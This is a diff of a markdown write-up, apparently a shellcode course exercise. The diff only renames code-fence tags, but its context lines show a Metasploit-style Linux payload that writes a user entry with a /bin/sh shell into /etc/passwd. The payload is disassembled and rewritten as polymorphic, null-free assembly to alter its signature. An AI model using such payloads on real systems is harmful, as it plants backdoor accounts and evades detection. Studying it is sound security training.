@@ -17,7 +17,7 @@ echo -n "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x7
 
 ## Disassembled Assembly
 
-```x86asm
+```assembly
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
@@ -64,7 +64,7 @@ echo -n "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51\x68\x73\x7
 ```
 
 Cleaning this results in the following commented code:
-```x86asm
+```assembly
 00000000  31C9              xor ecx,ecx
 00000002  89CB              mov ebx,ecx
 00000004  6A46              push byte +0x46
@@ -118,7 +118,7 @@ label1:
 
 I have cleaned and commented the code in the form of a `.nasm` file that can be built so I can modify and test my polymorphic code.
 
-```x86asm
+```assembly
 global _start
 
 section .text
@@ -180,7 +180,7 @@ Here I will dissect the assembly piece by piece, followed by a commented version
 
 First I replace `xor` with `sub` and `mov` with `xor` to zero out registers.
 
-```x86asm
+```assembly
 ; xor ecx,ecx
 sub ecx, ecx
 
@@ -190,7 +190,7 @@ xor ebx, ebx
 
 I also replaced a `push` and `pop` with a `mov al`. This is dangerous since `al` only sets the least significant byte. However, since we know eax will have the return value of `setreuid()` which is a zero if successful, this should be ok.
 
-```x86asm
+```assembly
 ; push byte +0x5
 ; pop eax             
 mov al, 0x5
@@ -198,7 +198,7 @@ mov al, 0x5
 
 Instead of an `xchg`, I `mov` 
 
-```x86asm
+```assembly
 ; xchg eax,ebx            ; ebx = ptr to file
 mov ebx, eax
 ```
@@ -206,7 +206,7 @@ mov ebx, eax
 Now, in order to remove nulls I had to change the following code a bit. Instead of just using a `call` to jump to the next section and get a pointer to the payload string here, I switched to pushing the string to the stack and moving the stack pointer into `ecx` to be used as the argument. 
 
 
-```x86asm
+```assembly
 push 0x2d2d6868         ; "---h"
 push 0x732f6e69         ; "s/ni"
 push 0x622f3a2f         ; "b/:/"
@@ -223,14 +223,14 @@ mov ecx, esp
 
 For the next change, I had to remove the clever section where metasploit referenced an opcode to use as the length of the string. I replaced the length of `0x26` with a `0x25` as well. 
 
-```x86asm
+```assembly
 ; mov edx,[ecx-0x4]   ; 0x26 = 38 (uses opcode from E826 at offset 0x26)
 mov dl, 0x25
 ```
 
 Next, I replace the `push`, `pop` with a `mov` instruction, as similar to the previous case, the return value of the previous `write()` call only fills the leaset significant byte, so it should be safe.
 
-```x86asm
+```assembly
 ; push byte +0x1      
 ; pop eax
 mov al, 0x1
@@ -241,7 +241,7 @@ mov al, 0x1
 
 Final code in the form of a `.nasm` file.
 
-```x86asm
+```assembly
 global _start
 
 section .text
